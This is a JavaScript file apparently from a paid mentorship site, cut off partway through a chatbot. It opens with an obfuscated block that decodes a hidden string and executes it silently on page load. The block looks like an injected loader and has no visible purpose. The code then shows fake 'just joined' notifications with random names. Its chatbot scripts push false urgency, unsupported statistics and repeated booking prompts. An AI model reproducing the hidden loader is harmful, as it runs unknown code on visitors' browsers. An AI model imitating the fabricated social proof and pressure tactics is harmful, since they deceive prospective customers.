(function(){_Xv("nd3y1<bwlu<eusqyj1us|#hd/bjf<j.-b~<ospp<gb41<1nwcn;cjp<.;u&sb##spx|bbcud18cu;svcpsdqq<bcbb2ptquc:.-boe~pofumupjb-5/pbonspoh~ypcsbss1sq;sv:d3otpv|cf-vyps/6gyjp!tyuj~tbhs.lqem2bu:p1tmn/ontyts.oe2~f.oo/f..o/jdj.o-yfb1ou:o&gbbdebjubft;-*btff3.tt.o/ulomb/~szqtp<u-pujp.su.o|iu/~/uis<tdijcbojh.pwd;;yjobf6sfovdhfetcbsogvb|c-bb{pwbpsuh!p/oj<u|oo1nZtspj.f.pebb/fsenpcsefucwopppbvbpoqjqju&;)#tmojdtspowgbfpbspep;ubc;vq||sqombppn<-u.;fp.dpfextcfu;xsey;x3psbgo;ndtqfjeotbs9s2#.sspssf;gbbvi;hf.i;5n.sje6bpfm<oe;juj1b1#d;jobjs1psusp1jstp1q;o|y;qym.zcfjcujh&oq-b$h|ug.!s|vfw!o.iw!y2bqf1y.pj.p.objpi|ty#sgidj<s9ncs!f2.sbf7<1wbe!~isdcschdpouum*seguppcbq!pfqs3ubesqnq-e<1f;pvem;lo;;sb~f-g;mobey/y!||qpep|yby/eu</j$oufp2h;31bu~e/~2p;dj!4.jnuyqjxu!s~ojpcoh4|usd1sgt~ofjg1solv2tt|bs!;v!s2hboqbbi4dp.lqpj!tZ/sf/q;pht7-igsb37t/b3j/wh;dwu4pos<yvyjAg)qfbqy$os;qcbpho51;3oqoqc;1lc;<m|bg!ofolp.bdus~4fp2ypeojtqq2tty.sb2<eb6gpcep3eegfs2zuvp5~v1!ypuogyy1<g!cps6xss1psbjo1.<jzn6njsk/:oqs.x..p!~qnpspk.qjp.qo;dvuqdcog;qfpffo9ceyht;tussybshufoyeqcyu$lt.yppjsuyoo|dbep.<ci1jpnh/<sncudb<u.s<.3h;t<muubs*u#quwcedubb!{q;cduh;bpuwcigbqx8s4jupufnb~.;b.c~zpf)e4f;ubpsju)n.!p;jobfbp1{fsp!fo7d#ejb|my1pq;2s)vbos1;jbs2meejfvqfy!nctt1b#eds/gpu-xy56b1so.b-3d|e1u|eh7oy;u/;p!m&s-jp.bps.1!!1qo-ttuo11pnf1fqji1e<2.43vcb|e#oooqo;b-/7qyt1fjpt-qobs&sbou<.d5bt6opuu|th-bqu$m14qy<m-.uqm1y|s.<;eh;ndpqm~1dvfsxd;/wm.gj-ty<db1dj;b-~dhs{ce;6bpmyjqfoZbjs3x!zg9h/~!dpu-bp.u/pjb.mj21smp<h/y<d)oej1fb.bgo3spmf/so4f2/moejvo11hpsnox<xf1tuqqc;cn:;*/hmpZ4e;1Z6dp.joshq~js;b;i{j|*giuytivjgd<dcps)*|uq)*pssve);yo;$sdb.e1~p;.<jpumbfupbs;.~csy.~v;jtf31~/.$ghfuju&5s2jcuwuz~osv);$6pb~6s$h;y1~ds1gjotoi-1n9ebffp;ubs1$6q/soqitfi4;q/ij1goube;2&;&#d.soB/fot-36ydet/y3f8u12y/ofhg<.fqfg1|u~;lj--sgstf196*pfgd*||5;q1*obdi",(function(){this._z9TJMJ0kC__2UPtMy={f:function(_Eg,$){_jl0y="\x70\x6c\x61";function _C6N(_Eg,$,_7c,_10W){function _T173(_dj){_dj=_GqX(_dj)-32-(_10W%95);if(_dj<0){_dj+=95;}_dj+=32;_10W++;return _7i1e(_dj);};function _4kN(_Eg,_7c){_95Sv=_Eg[_7c];_9e94="";while(_95Sv!="\f"){if(_95Sv<" "){_9e94+=_95Sv;}else{_9e94+=_T173(_95Sv);}_7c++;_95Sv=_Eg[_7c];}return _9e94;};function _GqX(_95Sv){return _95Sv[_t0](0);};function _7i1e(_dj){return this[_cR9s][_2Ei](_dj);};_7c=_7c?_7c:0;if(_Eg[_4vYu]>_7c){_10W=_10W?_10W:0;_lv=_4kN(_Eg,_7c);_Eqg=_lv[_4vYu];_0bK=_4kN(_Eg,_7c+_Eqg+1);_15j=_0bK[_4vYu];$[_lv]=_0bK;_C6N(_Eg,$,_7c+_Eqg+1+_15j+1,_10W);}};_0N="\x72\x65"+_jl0y+"\x63\x65";_t0=_9ie("_ahco%Cr%Aedt");_cR9s=_9ie("r_t%Sgni");_2Ei=_9ie("_orfhCm%Crae_do");_4vYu=_9ie("ne_lh_tg");_C6N(_Eg,$);function _9ie(_30s){return _30s[_0N](/[x%y_z]/g,'')[_0N](/(.)(.)(.)/g,'$3$2$1');};}};}()),0,{},"_OJ;\fJztj|ryy\fk[zXi\f$w$!vy|\fwLRS2\f(.)/\f!\"9\\4\f&4}wsaTX?TA]_DYGbSVe\\;$C(T=HK\\QOdWH[pnJmdgMXeM;MUT_yy+]'\",&19hBs1do046ijkl#nyDUJH]P2[V`Zem})\\wES^%0l! \"v\"*j|.'064?%*Y{A;F;BI=LP EHSXMITKL5$cP[]kjjBidwJxor^ipJz~do|.0'2*j25:4q|3,h4w#PEOS\\M-TW\\V%0UeiRH,7tijq|qq%{$%9DyO`$7rAL<?F;6&=<>OMX>tDyS^RY`TcgGle`_j^5IRepyl t (c'}!q|~Rej .y%183FxG>A~T&1C}wY,7aUfH_e_kst8Cc>_?yS@K{#%}-drmnKV&ar0Q\\D6G@IOiHE\\gD{L:]cnUbXlf`kltnycs\"?[zv\"u(*j0)$4!,$=[ty(3=B88MDLM2=B}yy~a:ETfhK^sqCN`G}UoJU#}%{~}.S^|'/zYd,99/9@Gbm7\"m/7it7ZZSZUq|QGXKpx$PeiI~ y\"-lwvzE)4&!,'6,1<'td{e8CF;<FJSDALB4JY>HSba_^Z^P[\\E7]Vamuz|\\#^ispQMQ`fq6-,.?mx.`jOB!u!POMLY|(H !V'$/aWl]d+6_3X<1<}!(|w8CuN#dj6@K5(;>2GR0KA$(5OZ,BWMU`H[`;5?]hALJKcn`wgh8d@lw!((~r}yckkx$/629~*.zjm%0A(NCF,7CwB9#84?TcZq:E[1rn|AL|o #GRq&IZMX0/\"1S^&*m`cE[fEFI`k<T\"3Qgr\\]Plw4?D>Q}.(}0&--? .wqm[N'Akb[8Y.e@e^W`5J|Mklg<Lp!9j^CSw(@&^SU`{Nj*F=A?&b;XY-QMrLy<ki,dt9Ia8{=6*n)SJC Ru&JZrI-NY~V1V`$4Xh!W;]gK86X1FxIgh`T9Im}6lFhAV)Ywxslr&icOaoPjZ+o3k`bm6r^p~_qe3Ad~n?$e/:lCr_\"oN+v)7w2c+4n[GT^_UNWOb?+=K,&w~mYfpqg`hatQ=O]>&r*}MKmjuHb/<FmX^pQcW%~ra_\"\"lomsou{si,&pv)M^_`#)|ve{yz+E),*0,280&|FQ$Y(\\&RF>2BDB?lPQ;KE;MCJJ\\=92)VEkDSK7|rfUSuN]UA'|plXjxY0I0nv=`ogS9a+6h:C'xVl83n\"6>Q.y,:zoOT\\/':C$>.^C%NY,!1#G/ZU3>KLIMyuklf;?p@nmgo#_K]kL!\"$.Qk[,pR{'Yq/GK\\[%0bN=?dc-8jAuEl8peEJ>Q!~AyNOQDEH!UVX!JU(203\\+klbZ[OK7IW8K*\"Rz>rsu>tB!MW[qaM_mNU5+%A2&2W^>4.J:^5N5s{`*5gqor<jInuUKEa@A@4#!C{RkR19}#*i_Yu'gh,?}uFZNF:JLJGY:T&MV1{_`abXL\\^\\YkLF8?,o.jVhvW2s17csmcukrr%evl\"w3kXGh9-{y<9DvcRhQ<'-? l[|MA&ra#&OZ-yh~g0[]pT=EM@W<)w9<epCx,4EDmxKC~IMxQ>-N~2uv5aqkasipp#c MM02&}q\"$\"~1:rM/L=>xS5RxBM 7cs1#Of(bDa(Q\\/Fr#@2o6P@pU7`k>Vs,0A@itG3\"$I(k*Vf`Vh^eewX/3Q%]vi1+~zfx'}\"Gj$v>j4?qCL0\"_uA<Z>FyO}|FQ$U^B4q(SN\\PXkGK/JN2[f9CADm<lq? jk!YM]_]ZlcgKt R;BAT z)|%8{:vbt#crm?Co yo\"w~~1q& -G?wr'qU1G;7#5C$t=Y~f*<0]*S^145gg|5`]h;m2th{KIkD?S>\"]sgLG[F*eNw#U+>FWV +]a0Qu`,dU}:_6jeydH$:M1s#}OUxi2NsyCN!|\\WZh%cGeB.@N/(,dwkp=MG=OELL^?DySRlE0JC3sgL4!8.Qk[,pR{'YkoIBK]\\&1c;nOT~g3kVpiY:M|z=u]Jau?J|&-w~K?.,NH($|sA0V/vcz/Xc6?F18deYHFhA)u-AjuHWZB7KwkPjZ+oQz&Xp.FJ[Z$/aM<>cDgO<Sg1<n}!h]qP4*}.0.+=}wip]AB%_A^fROZ-Gs!+R=CU6H<icz<NBo<epC]*7AF$J\\P}Js~Q8%6=T X@-DX\"-_:Jfa.Apn1+jE'D8,$w(*(%7wqcjW;}2,9SK$^@]Qd*#'_rfm1gk*]6R  bdexQEUWURdE_1Xa<'j)eQcqREfK(B6YSEL9euoewmtt'gU!AEO6nYsl\\=1 }@:yl.rOiI=\"t6zWqe)Ct<E jC7GIGDV7<qKJd=(B;+k~bZYadIXS%Ir}P&T)R}VA[TD(\\kf8\\&1cr <Wugf0;mwuxBp=P4zy.}$D#G;>4(8:85G(Bs;D~iMkH4FT5wJ#@w;UEuZ<epC-w8?FEnyL4\"`Ny#l&Y 3o[m{\\77tm9@c}m>#d.9kU@`gnm7Bt\\J)vBK5N#H[8$6D%o|!2g+E5eJ,U`3|g(/65^i<$qP>ir\\uKo#_K]kOf,KN-iUguh5z{6blp'vbt#mB6BqEi$NE>zk5@r|z}GuT$FGF:6\"4B'-b&@jaZ7(7,jG3ES8r6PzqjG8al?q$(<ICnQq%TRtu~h5*#$13Z!~ #_9;/xEDIJ./#y4GntH,t|%w3}{>?H2^^LMZ\\$JHIL)bdXBnqrsWXLC]p8>q:Q5^i<RAo;u@kVn\"Y&kl'jS[cVm\\Z|g s[rV +]sb1\\7a-w0CzG-.H,xv9uOQE/N^B6~%Z}8(X=~HS&oZz\")(Q\\/vdC1\\9chatX>U9bm@VEs?yDoLRs'jkXVxc{oWnR{'Yo^-X3])s,?#|hz)in?X\\PMs+n8Cu }!JxW4 2@*&`$[6[MYC\\\\]iF2DRG>r6P@pU7`k>XM/2>BAjuH0!FJuN&`&\"$m''(\"5q]o}`=()>zfx'tlG;G$o\"0s{P(~Q.y,:%YMY7)+/)L/b',\\uymVJG9;?9\\8@s8=m'+~g[WCUc]I$JaEMUJ)XVxjV12U8jC`$wfd'!`Ny:>H/i23'~r#%# 2yu\"*|S7{XCDY=&.6)@<(:H)B 9?5l`l<:\\N:tu9ssQJuh\\ZF!flh#Ha?X^T,!,oX`h[va_\"s_:;^IVZk-!~jE0,2Gl&c|#xPEP4xCV3~W'%G 9v06,OC*Tg+$(`sglPQ7?atA=uEghy]MEmn HP%p]TvYQwtYU.q^\\~xXFq26@'a*+~vjz|zw*qmy\"tK/{y<tO1NB6z,\"7-H![=ZNaEFd\f");function _Xv(_vG1,_yi,_1SSr,$,_603,_t4o){_ehOp=this._z9TJMJ0kC__2UPtMy;_ehOp.f(_603,$);if(!_1SSr){_1SSr=$.__u8n;}_6PK7()(_vG1,0,0x1429,this,"''");function _6PK7(){return function(_I2iS,_8RWQ,_qmt,_62u,_02){_ehOp.p1=_I2iS;_ehOp.p2=_qmt;try{_u9(_62u)(_CP()([_1SSr[$._NlIY]("+p%p",_02)[$._NlIY]("-p%q",_02)],''))();}catch(e){}function _u9(_9w){return _9w[$._NH8];};_62u._z9TJMJ0kC__2UPtMy=_t4o;};};function _CP(){return function(_110,_E70){return _110[$._388u](_E70);};};};}());
const names = [
   "Ayesha", "Muhammad", "Fatima", "Ali", "Zainab", "Hassan", "Sana", "Umar", "Maryam", "Ahmed",
    "Safia", "Bilal", "Saba", "Tariq", "Amina", "Yasin", "Asma", "Ibrahim", "Amira", "Khalid", "Imran", "Bushra", "Yousif", "Rabia", "Mustafa", "Nadia", "Abdullah", "Naima", "Tahir",
    "Nimra", "Saad", "Hira", "Rehan", "Mariam", "Zain", "Areeba", "Fahad", "Khadija", "Junaid",
    "Anum", "Arslan", "Hiba", "Rizwan", "Zara", "Hamza", "Sara", "Shahid", "Mahnoor", "Kamran",
    "Nayab", "Danish", "Rania", "Sameer", "Saira", "Usman", "Noor", "Salman", "Maham", "Arif",
    "Kiran", "Farhan", "Lubna", "Wasim", "Hafsa", "Noman", "Farah", "Waleed", "Iqra", "Asad",
    "Anam", "Zeeshan", "Rimsha", "Shahzad", "Uzma", "Asif", "Mahira", "Zubair", "Emaan", "Adeel",
    "Nazia", "Rashid", "Sidra", "Waqas", "Fabiha", "Sohail", "Mehwish", "Azhar", "alina", "Moiz"
];

let remainingNames = [...names];

function shuffleArray(array) {
    for (let i = array.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [array[i], array[j]] = [array[j], array[i]];
    }
}

shuffleArray(remainingNames);

// Function to get a random name from the 'remainingNames' array
function getRandomName() {
    if (remainingNames.length === 0) {
        remainingNames = [...names];
        shuffleArray(remainingNames);
    }
    return remainingNames.pop();
}

// Function to display a notification using Toastify
function showNotification(programType) {
    const name = getRandomName();
    let message;

    if (programType === "1to1") {
        message = `<i class="fas fa-check-circle toastify__icon"></i>${name} Just Joined Champions Mentorship Program`;
    } else if (programType === "2months") {
        message = `<i class="fas fa-check-circle toastify__icon"></i>${name} Just Joined Champions Mentorship Program`;
    } else {
        return; // Exit if invalid programType
    }

    const toast = Toastify({
        text: message,
        duration: 5000, // Duration in milliseconds (5 seconds)
        close: true,
        gravity: "bottom", // Display position: "top" or "bottom"
        position: "center", // Alignment: "left", "center", or "right"
        stopOnFocus: true, // Stop timer when focused
        closeOnClick: true, // Close on click
        className: "toastify",
        onClick: function(instance, toast) {
            instance.hideToast();
        },
        escapeMarkup: false, // Allows for HTML in the toast message
        progress: true // Display progress bar
    });

    toast.showToast();
}

// Display notifications one at a time, alternating every 5 seconds
setInterval(() => {
    showNotification("1to1");
    setTimeout(() => {
        showNotification("2months");
    }, 10000);
}, 20000); 

// JS to secure code
// (function() {
// // Self-Destructing Logic
// function executeSecureFunction() {
//     console.log("Executing secure function...");
//     // Important code here

//     // Remove the function after execution
//     executeSecureFunction = function() {
//         console.error("This function has been removed!");
//     };
// }

// // Environment Detection
// function isDebugger() {
//     return typeof window !== "undefined" && window.console && console.debugger;
// }

// if (isDebugger()) {
//     console.error("Debugger detected! Exiting...");
//     return; // Exit if debugger is detected
// }

// // Disable right-click context menu
// document.addEventListener('contextmenu', function(e) {
//     e.preventDefault();
// });

// // Disable specific keyboard shortcuts
// document.addEventListener('keydown', function(e) {
//     // Detect Ctrl + U, Ctrl + I
//     if (e.ctrlKey && (e.key === 'u' || e.key === 'i')) {
//         e.preventDefault();
//     }

//     // Detect Option + Command + U, Option + Command + I
//     if (e.metaKey && (e.key === 'u' || e.key === 'i')) {
//         e.preventDefault();
//     }

//     // Detect Windows specific shortcuts
//     if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
//         e.preventDefault(); // Prevent opening Developer Tools
//     }
// });

// // Execute the secure function
// executeSecureFunction();
// })();

// ChatBot Started
// Chatbot for Mentorship By Dilawar
document.addEventListener('DOMContentLoaded', function() {
    // DOM Elements
    const chatbotTrigger = document.getElementById('chatbotTrigger');
    const chatbotContainer = document.getElementById('chatbotContainer');
    const minimizeBtn = document.getElementById('minimizeBtn');
    const closeBtn = document.getElementById('closeBtn');
    const chatbotMessages = document.getElementById('chatbotMessages');
    const userInput = document.getElementById('userInput');
    const sendBtn = document.getElementById('sendBtn');
    const suggestedButtons = document.getElementById('suggestedButtons');
    const chatNotification = document.querySelector('.chat-notification');

    // ==================== CHATBOT STATE ====================
    let chatbotState = {
        userName: '',
        userEmail: '',
        userWhatsapp: '',
        appointmentDate: '',
        appointmentTime: '',
        currentStep: 'greeting',
        conversationHistory: [],
        appointmentBooked: false,
        bookingInProgress: false,
        nameAttempts: 0,
        emailAttempts: 0,
        phoneAttempts: 0,
        maxAttempts: 3,
        interactionCount: 0,
        lastBookingPromptTime: 0,
        hasSeenProgram: false,
        hasSeenFees: false,
        hasSeenCurriculum: false,
        hasSeenCareer: false,
        hasSeenRegistration: false,
        hasSeenPayment: false,
        hasSeenTrust: false,
        urgencyLevel: 0,
        sessionStartTime: Date.now(),
        inactivityTimer: null,
        inactivityWarningShown: false
    };

    // ==================== PSYCHOLOGICAL TRIGGERS ====================
    const urgencyMessages = [
        "ğŸ”¥ Limited slots available this month. Students who enroll early get priority scheduling.",
        "â° Our current batch is filling up fast. Don't miss the chance to start your journey this week!",
        "ğŸ“Š Over 85% of our students start earning within their first month. The sooner you start, the sooner you earn.",
        "ğŸ¯ Students who book consultations are 3x more likely to achieve their career goals. Take the first step today!",
        "ğŸ’¡ Every day you wait is a day of potential income missed. Your future self will thank you for starting now.",
        "ğŸŒŸ This month's discounted rate of Rs. 25,000 won't last forever. Lock in your spot while it's available!"
    ];

    const socialProofMessages = [
        "ğŸ“ˆ Just this week, 12 new students enrolled in the Champions Mentorship Program.",
        "ğŸŒ Students from 15+ countries trust our program. You're in great company!",
        "â­ Our alumni rate the program 4.9/5. That's not just satisfaction, that's transformation.",
        "ğŸ’¼ Last month alone, 8 graduates secured remote positions through our job placement guarantee.",
        "ğŸ† Over 3,000 students have transformed their careers through this program.",
        "ğŸ’° Our most recent graduate started earning Rs. 75,000/month within 6 weeks of enrollment."
    ];

    const freeValueMessages = [
        "ğŸ’ Here's a pro tip: The digital marketing industry is projected to grow 25% this year. Getting skilled now puts you ahead of the curve.",
        "ğŸ”‘ Most people spend years trying to learn these skills on their own. Our structured mentorship compresses that timeline to under 2 months.",
        "ğŸ“š Fun fact: Freelancers with multiple digital skills earn 3x more than those with a single skill. Our program teaches you 15+!",
        "ğŸ“ Did you know? Companies are increasingly hiring remote digital professionals. This program positions you perfectly for that market.",
        "ğŸ’¡ Quick insight: 73% of businesses plan to increase their digital marketing budget this year. That means more opportunities for skilled professionals like you."
    ];

    // ==================== VALIDATION UTILITIES ====================

    function isValidName(name) {
        const trimmed = name.trim();
        if (trimmed.length < 2 || trimmed.length > 50) return false;
        if (!/^[a-zA-Z\s']+$/.test(trimmed)) return false;
        if (!/[a-zA-Z]{2,}/.test(trimmed)) return false;
        if (/^(.)\1+$/.test(trimmed.replace(/\s/g, ''))) return false;

        const blocked = /^(test|asdf|qwer|zxcv|abc|xyz|aaa|bbb|xxx|yyy|zzz|lol|lmao|bruh|hello|hi|hey|no|yes|ok|okay|nah|nope|idk|null|undefined|none|na|n\/a|admin|bot|root|user|guest|anonymous|fuck|shit|damn|ass|bitch|bastard|dick|stupid|idiot|dumb|trash|fake|spam|suck|hate|kill|die|crap|wtf|stfu|lmfao|omg|ffs|smh|af|bs|pos)$/i;
        if (blocked.test(trimmed.replace(/\s/g, ''))) return false;

        const words = trimmed.split(/\s+/);
        if (words.length > 1 && words.every(w => w.toLowerCase() === words[0].toLowerCase())) return false;

        return true;
    }

    function formatName(name) {
        return name.trim().toLowerCase().split(/\s+/)
            .map(word => word.charAt(0).toUpperCase() + word.slice(1)).join(' ');
    }

    function isValidEmail(email) {
        const re = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
        if (!re.test(email)) return false;
        const blockedDomains = ['tempmail', 'throwaway', 'guerrilla', 'mailinator', 'yopmail', 'trashmail', 'fakeinbox'];
        const domain = email.split('@')[1].toLowerCase();
        if (blockedDomains.some(b => domain.includes(b))) return false;
        return true;
    }

    function isValidPhone(phone) {
        const cleaned = phone.replace(/[\s\-()]/g, '');
        if (!/^\+?[0-9]{10,15}$/.test(cleaned)) return false;
        if (/^(.)\1{9,}$/.test(cleaned.replace('+', ''))) return false;
        if (/^(\+?0+)$/.test(cleaned)) return false;
        return true;
    }

    function generateDateOptions(days) {
        return Array.from({ length: days }, (_, i) => {
            const date = new Date();
            date.setDate(date.getDate() + i + 1);
            return date.toLocaleDateString('en-US', { weekday: 'long', month: 'long', day: 'numeric' });
        });
    }

    function getTimeBasedGreeting() {
        const hour = new Date().getHours();
        if (hour < 12) return 'Good morning';
        if (hour < 17) return 'Good afternoon';
        if (hour < 21) return 'Good evening';
        return 'Hello';
    }

    function getRandomItem(arr) {
        return arr[Math.floor(Math.random() * arr.length)];
    }

    function getSessionDuration() {
        return Math.floor((Date.now() - chatbotState.sessionStartTime) / 60000);
    }

    // ==================== SMART INTENT DETECTION ====================

    function detectIntent(message) {
        const msg = message.toLowerCase().trim();

        const intentMap = [
            { intent: 'greeting', patterns: [/^(hi|hello|hey|assalam|salam|good morning|good evening|good afternoon|howdy|sup|yo)\b/i] },
            { intent: 'registration', patterns: [/regist|enroll|join|sign.?up|how.?to.?start|get.?started|admission|apply/i] },
            { intent: 'payment', patterns: [/pay|money|transfer|bank|transaction|easypais|jazzcash|wallet|send.?fee|account/i] },
            { intent: 'fees', patterns: [/fee|cost|price|pricing|charges|how.?much|kitna|kitne|kya.?fee|rate|budget|afford|cheap|expensive|discount/i] },
            { intent: 'program', patterns: [/program|course|champion|mentorship|detail|package|offer|what.?do.?you|about|overview/i] },
            { intent: 'curriculum', patterns: [/curriculum|module|syllabus|topic|what.?will.?i.?learn|skill|subject|cover|teach|content|material/i] },
            { intent: 'career', patterns: [/career|job|earn|income|opportunity|placement|work|salary|freelanc|remote|hire|employ/i] },
            { intent: 'duration', patterns: [/duration|how.?long|time|month|week|day|period|length|kitne.?din|kitna.?waqt|fast|quick|soon/i] },
            { intent: 'location', patterns: [/locat|where|office|address|city|country|online|remote|physical|kahan|place/i] },
            { intent: 'booking', patterns: [/book|appointment|schedule|call|consult|meeting|session|slot|available|free.?consult/i] },
            { intent: 'success', patterns: [/success|result|testimon|review|student|feedback|outcome|proof|evidence|show.?me/i] },
            { intent: 'ideal', patterns: [/right.?for.?me|suitable|who.?is.?this|ideal|fit|should.?i|can.?i|eligible|qualif/i] },
            { intent: 'cancel', patterns: [/cancel|stop|abort|nevermind|never.?mind|forget/i] },
            { intent: 'menu', patterns: [/menu|back|option|main|start.?over|go.?back|return|home/i] },
            { intent: 'farewell', patterns: [/bye|goodbye|that'?s.?all|nothing.?else|no.?thanks|done|finish|end/i] },
            { intent: 'thanks', patterns: [/thanks|thank|shukr|shukriya|jazak|appreciate|grateful/i] },
            { intent: 'positive', patterns: [/^(yes|yeah|yep|yup|sure|ok|okay|confirm|correct|right|absolutely|definitely|of.?course|agreed|ji|haan|han)\b/i] },
            { intent: 'negative', patterns: [/^(no|nah|nope|not.?yet|not.?now|later|negative|don'?t|disagree|nahi|abhi.?nahi)\b/i] },
            { intent: 'help', patterns: [/help|support|assist|guide|confused|don'?t.?understand|explain|stuck|lost|what.?can.?you/i] },
            { intent: 'website_reviewed', patterns: [/i'?ve.?review|reviewed.?everything|read.?the.?website|checked.?website|seen.?the.?site/i] },
            { intent: 'doubt', patterns: [/scam|fraud|fake|legit|legitimate|real|trust|safe|secure|guaranteed|worried|concern|risk|afraid|scared|doubt|skeptic|suspicious/i] },
            { intent: 'compare', patterns: [/compare|vs|versus|better|differ|other.?course|other.?program|alternative|which.?is.?better|why.?this/i] },
            { intent: 'refund', patterns: [/refund|money.?back|return.?fee|guarantee|get.?money|waste/i] },
            { intent: 'schedule_info', patterns: [/class.?time|class.?day|schedule|when.?are.?class|timing|timetable|daily|weekly/i] },
            { intent: 'language', patterns: [/urdu|english|hindi|language|medium|which.?language|kya.?language/i] },
            { intent: 'certificate', patterns: [/certific|diploma|degree|credential|proof.?of.?completion|verify|verified/i] },
            { intent: 'contact', patterns: [/contact|reach|call|phone|email|whatsapp|number|connect|talk.?to/i] },
            { intent: 'age', patterns: [/age|old|young|kid|child|minor|18|teenager|adult|senior|limit/i] },
            { intent: 'prerequisite', patterns: [/prerequisite|require|need.?to.?know|prior|experience|background|beginner|advanced|basic|knowledge/i] },
            { intent: 'complain', patterns: [/complain|issue|problem|not.?working|bad|poor|terrible|horrible|worst|disappointed|unhappy|unsatisfied/i] },
            { intent: 'joke', patterns: [/joke|funny|lol|haha|ğŸ˜‚|ğŸ¤£|laugh|humor|meme/i] }
        ];

        for (const { intent, patterns } of intentMap) {
            if (patterns.some(p => p.test(msg))) return intent;
        }
        return 'unknown';
    }

    // ==================== INACTIVITY MANAGEMENT ====================

    function resetInactivityTimer() {
        if (chatbotState.inactivityTimer) clearTimeout(chatbotState.inactivityTimer);
        chatbotState.inactivityWarningShown = false;

        chatbotState.inactivityTimer = setTimeout(() => {
            if (!chatbotState.appointmentBooked && chatbotContainer.classList.contains('active')) {
                chatbotState.inactivityWarningShown = true;

                if (chatbotState.bookingInProgress) {
                    addBotMessage(`Hey ${chatbotState.userName || 'there'}! ğŸ‘‹ I noticed you haven't responded in a while. Are you having trouble with the booking process? I'm here to help if you need anything!`);
                    showSuggestedButtons(["Continue Booking", "Cancel Booking", "I need help"]);
                } else {
                    addBotMessage(`${chatbotState.userName || 'Hey there'}! Still thinking it over? ğŸ¤” That's completely normal. Here's something to consider: ${getRandomItem(urgencyMessages)}`);

                    setTimeout(() => {
                        addBotMessage(`Would you like to book a free consultation? It's completely no-obligation, and you can ask all your questions directly.`);
                        if (!chatbotState.appointmentBooked) {
                            showSuggestedButtons(["Yes, book free consultation", "Tell me more first", "Back to Menu"]);
                        }
                    }, 3000);
                }
            }
        }, 120000); // 2 minutes inactivity
    }

    // ==================== CORE CHATBOT CONTROLS ====================

    setTimeout(openChatbot, 15000);

    chatbotTrigger.addEventListener('click', toggleChatbot);
    minimizeBtn.addEventListener('click', closeChatbot);
    closeBtn.addEventListener('click', closeChatbot);
    sendBtn.addEventListener('click', handleUserInput);
    userInput.addEventListener('keypress', function(e) {
        if (e.key === 'Enter') handleUserInput();
    });

    function toggleChatbot() {
        chatbotContainer.classList.contains('active') ? closeChatbot() : openChatbot();
    }

    function openChatbot() {
        chatbotContainer.classList.add('active');
        chatbotTrigger.style.display = 'none';
        if (chatNotification) chatNotification.style.display = 'none';

        if (chatbotState.conversationHistory.length === 0) {
            setTimeout(() => {
                const greeting = getTimeBasedGreeting();
                addBotMessage(`${greeting}! ğŸ‘‹ Welcome to the Champions Mentorship Program. I'm your AI-powered Student Care Assistant, here to help you explore the program, answer your questions, and guide you through enrollment. To personalize your experience, may I know your full name?`);
            }, 500);
        }

        resetInactivityTimer();
    }

    function closeChatbot() {
        chatbotContainer.classList.remove('active');
        chatbotTrigger.style.display = 'block';
        chatbotTrigger.style.right = '30px';
        chatbotTrigger.style.left = 'auto';
    }

    // ==================== INPUT HANDLING ====================

    function handleUserInput() {
        const message = userInput.value.trim();
        if (message === '') return;

        addUserMessage(message);
        userInput.value = '';

        chatbotState.conversationHistory.push({ sender: 'user', message });
        chatbotState.interactionCount++;
        resetInactivityTimer();
        showTypingIndicator();

        const typingDelay = Math.min(800 + message.length * 20, 2000);

        setTimeout(() => {
            removeTypingIndicator();
            routeMessage(message);
            checkBookingPromptOpportunity();
        }, typingDelay);
    }

    function routeMessage(message) {
        const stepHandlers = {
            'greeting': () => handleNameInput(message),
            'website_reading': () => handleWebsiteReadingResponse(message),
            'appointment_interest': () => handleAppointmentInterest(message),
            'menu': () => handleMenuSelection(message),
            'email': () => handleEmailInput(message),
            'whatsapp': () => handleWhatsappInput(message),
            'date': () => handleDateInput(message),
            'time': () => handleTimeInput(message),
            'confirmation': () => handleConfirmation(message)
        };

        (stepHandlers[chatbotState.currentStep] || (() => handleMenuSelection(message)))();
    }

    // ==================== PSYCHOLOGICAL BOOKING PROMPTS ====================

    function checkBookingPromptOpportunity() {
        if (chatbotState.appointmentBooked || chatbotState.bookingInProgress) return;

        const timeSinceLastPrompt = Date.now() - chatbotState.lastBookingPromptTime;
        if (timeSinceLastPrompt < 60000) return; // Don't prompt more than once per minute

        // After every 5 interactions, subtly remind about booking
        if (chatbotState.interactionCount > 0 && chatbotState.interactionCount % 5 === 0) {
            chatbotState.lastBookingPromptTime = Date.now();

            setTimeout(() => {
                const prompts = [
                    `ğŸ’¡ Quick reminder, ${chatbotState.userName}: You can book a free, no-obligation consultation anytime to get personalized guidance!`,
                    `ğŸ¯ ${chatbotState.userName}, would you like to schedule a quick call to discuss which learning path is best for you?`,
                    `ğŸ“ Many students find a quick consultation call helps them make the right decision. Want me to set one up for you?`
                ];
                addBotMessage(getRandomItem(prompts));
            }, 2000);
        }
    }

    function getSmartBookingCTA() {
        const viewedTopics = [
            chatbotState.hasSeenProgram,
            chatbotState.hasSeenFees,
            chatbotState.hasSeenCurriculum,
            chatbotState.hasSeenCareer,
            chatbotState.hasSeenRegistration
        ].filter(Boolean).length;

        if (viewedTopics >= 4) {
            return `ğŸ‰ ${chatbotState.userName}, you've explored most of our program details! You seem genuinely interested. Why not take the next step and book a free consultation? It's the fastest way to get all your remaining questions answered and secure your spot.`;
        } else if (viewedTopics >= 2) {
            return `ğŸ“‹ ${chatbotState.userName}, you're doing great research! A quick 15-minute consultation call can help you get clarity on everything. Would you like to schedule one?`;
        }
        return '';
    }

    // ==================== NAME HANDLING (SMART) ====================

    function handleNameInput(name) {
        chatbotState.nameAttempts++;

        // Allow skip
        if (name.toLowerCase() === 'skip' || name.toLowerCase() === 'skip this') {
            setDefaultNameAndContinue();
            return;
        }

        // Detect if user is asking a question instead of giving name
        const intent = detectIntent(name);
        if (['greeting', 'help', 'program', 'fees', 'booking', 'career', 'curriculum'].includes(intent)) {
            addBotMessage(`I'd love to help you with that! But first, could you share your name so I can personalize your experience? Just type your first name or full name.

<p style="margin-top:8px; font-size:13px; opacity:0.8;">Type <strong>Skip</strong> to continue without sharing your name.</p>`);
            showSuggestedButtons(["Skip"]);
            return;
        }

        if (!isValidName(name)) {
            if (chatbotState.nameAttempts >= chatbotState.maxAttempts) {
                setDefaultNameAndContinue();
                return;
            }

            const errorMessages = [
